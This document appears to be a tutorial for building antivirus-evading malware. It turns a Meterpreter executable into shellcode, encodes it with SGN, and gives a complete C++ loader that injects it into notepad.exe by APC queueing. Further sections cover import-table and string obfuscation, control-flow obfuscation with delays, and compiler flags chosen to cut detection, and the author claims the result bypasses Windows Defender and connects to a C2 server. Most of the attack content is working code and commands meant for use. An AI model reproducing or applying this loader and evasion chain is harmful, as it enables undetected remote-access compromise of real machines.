## Table of Contents

- [**Outline**](#section-0)
- [**EXEtoShellCode**](#section-1)
- [**Shellcode Encoding**](#section-2)
- [**ShellCode Loader**](#section-3)
- [**Payload Obfuscation**](#section-4)
- [**IAT Obfuscation**](#section-5)
- [**String Obfuscation**](#section-6)
- [**Control Flow Obfuscation**](#section-7)
- [**Compiling Obfuscation**](#section-8)
- [**Conclusion**](#section-6)




## Outline  {#section-0}
![](/assets/AV/APC.png)


We will create a malicious MSI payload containing an obfuscated executable using the APC Queue shellcode injection technique. During this process, we will apply multiple obfuscation methods to bypass both signature and behavioral detection, including shellcode obfuscation, IAT obfuscation, control flow obfuscation, payload signing, and file bloating.


APC Queue shellcode injection is a method where attackers inject malicious code into a running process by taking advantage of a system feature called Asynchronous Procedure Call (APC). APC is used by Windows to run certain tasks in a thread. In this technique, the attacker places their malicious code (shellcode) into a queue, and when the process runs its next task, it unknowingly executes the injected code instead of the original one.


The Proof of Concept video below shows the payload successfully bypassing the latest Windows Defender, establishing a reverse connection to the C2 server.

<video style="max-width: 100%; height: auto;" controls>
  <source src="/assets/AV/MSI.mp4" type="video/mp4">
</video>

## Creating MSI Malware {#section-0}


## Executable to Shell Code
We will convert meterpreter EXE to shellcode using donut.


https://github.com/TheWover/donut

This Donut command loads piggy.exe into memory with:
1) no entropy obfuscation (-e)

2) uses AMSI/WLDP/ETW bypass with a fail-safe option to continue if bypass fails (-b)

3) compresses the file using the aPLib engine (-z 2), and employs a decoy module at level 5 (-j 5) for added obfuscation and evasion.

```bash
./donut -i /home/kali/donut/piggy.exe -e 1 -b 3 -z -j 5
```

![](/assets/AV/donutImage.png)  

However, as expected the shellcode.bin when uploaded to virus total  has a large detection rate

![](/assets/AV/loaderVirus.png)  

## Polymorphic Shellcode Encoding (Shiginakatai)
While there are many shell code encryption and encoding methods such as XOR, AES, UUID, IPV4 obfuscation, some libraries and decryption functions are flagged by antivirus solutions such as AES decryption routine.
Here we will use a simple yet effective encoding  to obfuscate our payload, SGN encoding. “SGN is a polymorphic binary encoder for offensive security purposes such as generating statically undetectable binary payloads”.  It is the upgraded version of the famous shikata_ga_nai.rb used in metasploit.


https://github.com/EgeBalci/sgn
Now we will conduct shellcode obfuscation. -i is used for the input file (the meterpreter rat shellcode) and -o is the output. -a is for the architecture and -c is the number of encoding 
![](/assets/AV/sgn.png)  


```bash
sgn -i '/home/kali/donut/loader.bin' -o /home/kali/donut/loaderEncrypted.bin -a 64 -c 8 --verbose
```

The advantage of SGN is that during run time it will un-encode itself thereby the testers do not have to implement the un-encoding function. Testers need to simply load the obfuscated payload bin to their code.

Uploading the shellcode we get a 0 detection rate.
![](/assets/AV/zero.png)  


The advantage of SGN is that during run time it will un-encode itself thereby the testers do not have to implement the un-encoding function. Testers need to simply load the obfuscated payload bin to their code.

## Creating APC Shellcode Loader
Creating a Shellcode Loader

Now that we have our encoded shellcode, we need to create a PE, exe file to launch this shellcode using c++.

**VirtualAlloc**: Allocates memory for the payload, typically using MEM_COMMIT and PAGE_READWRITE to allow writing to the allocated memory.

**RtlMoveMemory**: Copies the payload (malicious code) from the file or buffer into the newly allocated memory region.
VirtualProtect: Changes the protection of the allocated memory from PAGE_READWRITE to PAGE_EXECUTE_READ to allow the payload to execute.

**CreateThread**: Starts a new thread, executing the payload in memory. This is the method used to run the injected code.
WaitForSingleObject: Pauses the current thread until the thread running the payload finishes execution, ensuring the payload completes.

**QueueUserAPC**: This function queues an Asynchronous Procedure Call (APC) to a specific thread. If used with a thread in an alertable state (such as one created with SleepEx or WaitForSingleObjectEx), the payload will be executed when the thread enters that state. This technique is commonly used to inject code into a thread in a less obvious manner, bypassing some common defenses.

```bash
#include <windows.h>
#include <windows.h>
#include <stdio.h>

// Function to read a binary file
unsigned char* readBinaryFile(const char* fileName, SIZE_T* size) {
    FILE* file = fopen(fileName, "rb");
    if (!file) {
        printf("Could not open file %s\n", fileName);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(*size);
    if (!buffer) {
        printf("Memory allocation failed\n");
        fclose(file);
        return NULL;
    }

    fread(buffer, 1, *size, file);
    fclose(file);
    return buffer;
}

int main() {
    // Read shellcode from the binary file (e.g., loaderEncrypted.bin)
    const char* fileName = "loaderEncrypted.bin";
    SIZE_T shellcodeSize;
    unsigned char* shellcode = readBinaryFile(fileName, &shellcodeSize);
    
    if (!shellcode) {
        printf("Failed to read the binary file.\n");
        return -1;
    }

    // Create a suspended Notepad process
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Failed to create process\n");
        free(shellcode);
        return -1;
    }

    // Allocate memory in the target process
    LPVOID bufferAddr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!bufferAddr) {
        printf("VirtualAllocEx failed\n");
        free(shellcode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Write the shellcode into the allocated memory
    if (!WriteProcessMemory(pi.hProcess, bufferAddr, shellcode, shellcodeSize, NULL)) {
        printf("WriteProcessMemory failed\n");
        free(shellcode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    // Queue the APC for the shellcode to be executed
    QueueUserAPC((PAPCFUNC)bufferAddr, pi.hThread, NULL);

    // Resume the suspended thread to execute the shellcode
    ResumeThread(pi.hThread);

    // Cleanup
    free(shellcode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}


```
## IAT Obfuscation

One thing to note is that using the above WIN32 API directly, such as VirtualAllocEX, QueueUserAPC and etc will be likely flagged as suspicious. We can verify this by checking the Import Address Table by  utilizing a tool called PE Studio

 ![](/assets/AV/PE.png)  
Dynamic Function Resolution: GetProcAddress is used to dynamically resolve the addresses of the required functions 

```bash

HMODULE hKernel32 = GetModuleHandle("kernel32.dll");

LPVOID (WINAPI * pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
pVirtualAllocEx = (LPVOID (WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(hKernel32, "VirtualAllocEx");

```

If we do not want to do this manually, we can use built in importers.
```bash
https://github.com/JustasMasiulis/lazy_importer
```
Download the lazy_importer.hpp and save it in a folder called include. 
Simply add LI_FN() to the function.

We can further implement a custom GetProcAddress to hide its WINAPI Function call but this time we leave it out. 


## String Obfuscation
Let's take the following code snippet for example, where we create a notepad process for future shell code injection, 
the string c:\\windows\\system32\notepad.exe is identified in the executable. We can check this using strings.
```bash
strings.exe -n 8 implant.exe | findstr /i "C:\\windows"
```
As seen below, the string is identified. 

 ![](/assets/AV/string.png)  

To hide the strings we can Import String Obfuscator skCrypter:

https://github.com/skadro-official/skCrypter

```bash
#include "skCrypter"
CreateProcessA(skCrypt(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
```
## Control Flow Obfuscation

In order to bypass behavior and herustic detection, we implement control flow obfuscation technique.
Control flow obfuscation  breakes down a standard process of shellcode injection into multiple distinct states, interspersed with benign actions to hinder detection and analysis ,effectively obfuscating the overall execution path and intent

The State enum defines various stages of the process:

**STATE_ALLOCATE**: Allocates memory in the target process using VirtualAllocEx.

**STATE_BENIGN**: Executes benign actions and adds a delay to obscure the intent of the program, making it harder for static analysis tools to detect malicious behavior.
STATE_WRITE: Writes the shellcode into the allocated memory with WriteProcessMemory.

**STATE_BENIGN_AGAIN**: Executes additional benign actions, further confusing analysis tools and delaying detection.

S**TATE_EXECUTE**: Executes the shellcode by queuing it with QueueUserAPC.



```bash
enum State {
    STATE_ALLOCATE,
    STATE_BENIGN,
    STATE_WRITE,
    STATE_BENIGN_AGAIN,
    STATE_EXECUTE,
    STATE_DONE
};

void obfuscatedControlFlow(LPVOID shellcode, SIZE_T shellcodeSize, PROCESS_INFORMATION* pi, 
    LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD),
    BOOL (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*),
    DWORD (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR)) 
{
    State state = STATE_ALLOCATE;
    LPVOID bufferAddr = NULL;
    
    while (state != STATE_DONE) {
        switch (state) {
            case STATE_ALLOCATE:
                // Allocate memory in the target process
                bufferAddr = pVirtualAllocEx(pi->hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (bufferAddr) {
                    state = STATE_BENIGN;
                }
                break;

            case STATE_BENIGN:
                // Perform some benign system activities to confuse analysis
                performBenignActions();
                advancedSleep();
                state = STATE_WRITE;  // Move to the next state
                break;

            case STATE_WRITE:
                // Write the shellcode into the allocated memory
                if (pWriteProcessMemory(pi->hProcess, bufferAddr, shellcode, shellcodeSize, NULL)) {
                    state = STATE_BENIGN_AGAIN;
                } else {
                    state = STATE_DONE;  // Error encountered
                }
                break;

            case STATE_BENIGN_AGAIN:
                // Perform more benign activities after writing shellcode
                performBenignActions();
                state = STATE_EXECUTE;  // Proceed to execution after more obfuscation
                break;

            case STATE_EXECUTE:
                // Queue the APC for the shellcode to be executed
                advancedSleep();
                randomSleep(10000, 110000);
                
                pQueueUserAPC((PAPCFUNC)bufferAddr, pi->hThread, NULL);
                state = STATE_DONE;
                break;

            default:
                state = STATE_DONE;
                break;
        }
    }
}
```
## Compiling with different Flags to reduce detection
Optimizing and using different flags can lead to reduced signatures because each time a different PE file is produced.

Using different compilation flags can significantly reduce the detection rate of malware by security tools, as each compilation can result in a unique Portable Executable (PE) file with variations in structure, function ordering, and optimizations, thereby reducing signature-based detection.

Key Flags and Their Impact:
-O2: Optimizes the code for speed, producing efficient binary code.

-Ob2: Inlines functions aggressively, making the code harder to analyze by combining multiple functions into one.

-Os: Optimizes for binary size, reducing the file size, which can help evade detection as the smaller footprint might bypass some heuristic checks.

-fno-stack-protector: Disables stack protection mechanisms, which are security features. While this reduces protection against buffer overflows, it might also reduce the likelihood of triggering security defenses in static analysis.

-fno-unroll-loops: Prevents loop unrolling, keeping loops as-is. This reduces the predictability of code patterns that AV engines often flag.

-s: Strips debugging information, making the binary smaller and removing unnecessary symbols that might contribute to detection.

-Xlinker -pdb:none: Removes the generation of program database files (PDBs), further reducing metadata that can trigger detection.

-Xlinker -subsystem:console: Specifies the subsystem for the executable, which can alter how it's handled by the OS and can make it harder for some scanners to detect.

By combining these flags, each compilation creates a binary with different characteristics, thus evading detection mechanisms that rely on static signatures.

```bash
clang++.exe -O2 -Ob2 -Os -fno-stack-protector -o your_malware.exe implant.cpp -luser32 -lkernel32 -fno-unroll-loops -fno-exceptions -fno-rtti -s

clang++.exe -O2 -Ob2 -Os -fno-stack-protector -Xlinker -pdb:none -Xlinker -subsystem:console -o malware.exe implant.cpp -luser32 -lkernel32 -fno-unroll-loops -fno-exceptions -fno-rtti  GNU
``

- [**Results**](#section-8)

Uploading the implant.exe, we get a detection rate of 2 out of 39 engines from Kleenscan
https://kleenscan.com/scan_result/d7abfbf0cddff7295257abcaafde2181b88ce647e18e2bc51c2d5f82425bb120 